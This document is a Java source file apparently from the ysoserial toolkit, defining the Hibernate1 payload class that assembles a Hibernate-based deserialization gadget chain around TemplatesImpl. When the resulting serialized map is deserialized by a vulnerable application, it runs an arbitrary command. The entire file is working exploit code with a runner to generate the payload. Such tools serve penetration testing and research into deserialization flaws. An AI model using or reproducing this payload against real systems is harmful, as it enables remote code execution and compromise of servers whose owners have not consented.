package ysoserial.payloads;


import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;

import sun.reflect.ReflectionFactory;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * 
 * org.hibernate.property.access.spi.GetterMethodImpl.get()
 * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
 * org.hibernate.type.ComponentType.getPropertyValue(C)
 * org.hibernate.type.ComponentType.getHashCode()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.internal.util.ValueHolder.getValue()
 * org.hibernate.engine.spi.TypedValue.hashCode()
 * 
 * 
 * Requires:
 * - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
 * 
 * @author mbechler
 */
@SuppressWarnings ( {
    "restriction", "nls", "javadoc"
} )
@Dependencies ( {
    "org.hibernate:hibernate-core:5.0.7.Final",
    // or (also change in POM)
    // "org.hibernate:hibernate-core:4.3.11.Final",
    
    // test deps
    "aopalliance:aopalliance:1.0", 
    "org.jboss.logging:jboss-logging:3.3.0.Final", 
    "javax.transaction:javax.transaction-api:1.2"
} )
public class Hibernate1 implements ObjectPayload<Object> {

    public Object makeGetter ( Class<?> tplClass ) throws NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException,
            IllegalArgumentException, InvocationTargetException, ClassNotFoundException {

        try {
            Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
            return makeHibernate4Getter(tplClass);
        }
        catch ( ClassNotFoundException e ) {}

        try {
            Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
            return makeHibernate5Getter(tplClass);
        }
        catch ( ClassNotFoundException e ) {}

        throw new ClassNotFoundException("No supported hibernate version");
    }


    public Object makeHibernate4Getter ( Class<?> tplClass ) throws ClassNotFoundException, NoSuchMethodException, SecurityException,
            InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        Class<?> getterIf = Class.forName("org.hibernate.property.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
        Constructor<?> bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
        bgCon.setAccessible(true);
        Object g = bgCon.newInstance(tplClass, tplClass.getMethod("getOutputProperties"), "outputProperties");
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }


    public Object makeHibernate5Getter ( Class<?> tplClass ) throws NoSuchMethodException, SecurityException, ClassNotFoundException,
            InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        Class<?> getterIf = Class.forName("org.hibernate.property.access.spi.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor<?> bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);
        Object g = bgCon.newInstance(tplClass, "test", tplClass.getMethod("newTransformer"));
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }


    /**
     * {@inheritDoc}
     *
     * @see ysoserial.payloads.ObjectPayload#getObject(java.lang.String)
     */
    public Object getObject ( String command ) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(command); // $NON-NLS-1$
        Object getters = makeGetter(tpl.getClass());

        Constructor<Object> tupCons = Object.class.getDeclaredConstructor();
        tupCons.setAccessible(true);
        ReflectionFactory rf = ReflectionFactory.getReflectionFactory();
        Constructor<?> sc = rf.newConstructorForSerialization(PojoComponentTuplizer.class, tupCons);
        sc.setAccessible(true);

        PojoComponentTuplizer tup = (PojoComponentTuplizer) sc.newInstance();

        Field gF = AbstractComponentTuplizer.class.getDeclaredField("getters"); //$NON-NLS-1$
        gF.setAccessible(true);
        gF.set(tup, getters);

        Constructor<AbstractType> typeCons = AbstractType.class.getDeclaredConstructor();
        tupCons.setAccessible(true);
        Constructor<?> tc = rf.newConstructorForSerialization(ComponentType.class, typeCons);
        tc.setAccessible(true);

        ComponentType t = (ComponentType) tc.newInstance();
        Reflections.setFieldValue(t, "componentTuplizer", tup);
        Reflections.setFieldValue(t, "propertySpan", 1);
        Reflections.setFieldValue(t, "propertyTypes", new Type[] {
            t
        });

        TypedValue v1 = new TypedValue(t, null);
        Reflections.setFieldValue(v1, "value", tpl);
        Reflections.setFieldValue(v1, "type", t);

        TypedValue v2 = new TypedValue(t, null);
        Reflections.setFieldValue(v2, "value", tpl);
        Reflections.setFieldValue(v2, "type", t);

        return Gadgets.makeMap(v1, v2);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Hibernate1.class, args);
    }
}
